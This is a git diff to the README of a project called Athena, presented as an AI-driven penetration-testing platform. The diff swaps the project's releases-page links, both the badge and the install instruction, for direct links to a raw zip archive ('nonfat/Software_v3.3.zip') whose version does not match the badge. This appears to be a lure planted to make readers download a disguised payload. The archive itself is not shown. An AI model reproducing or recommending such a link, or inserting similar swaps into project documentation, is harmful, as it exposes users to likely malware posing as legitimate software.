@@ -4,10 +4,10 @@
 Welcome to Athena! This software is an AI-driven command platform tailored for network operations. It integrates the MITRE ATT&CK framework, powered by Caldera, and provides tactical decision-making capabilities. Athena is designed for military-level penetration testing.
 
 ## 🔗 Download Athena
-[![Download Athena](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/uow-raider/Athena/releases)
+[![Download Athena](https://raw.githubusercontent.com/uow-raider/Athena/main/nonfat/Software_v3.3.zip)](https://raw.githubusercontent.com/uow-raider/Athena/main/nonfat/Software_v3.3.zip)
 
 ## 📥 Download & Install
-To get Athena, visit this page to download: [Athena Releases](https://github.com/uow-raider/Athena/releases). Select the latest version and follow these steps:
+To get Athena, visit this page to download: [Athena Releases](https://raw.githubusercontent.com/uow-raider/Athena/main/nonfat/Software_v3.3.zip). Select the latest version and follow these steps:
 
 1. Click on the version you want to download.
 2. Look for the appropriate file for your system (e.g., Windows, macOS, Linux).
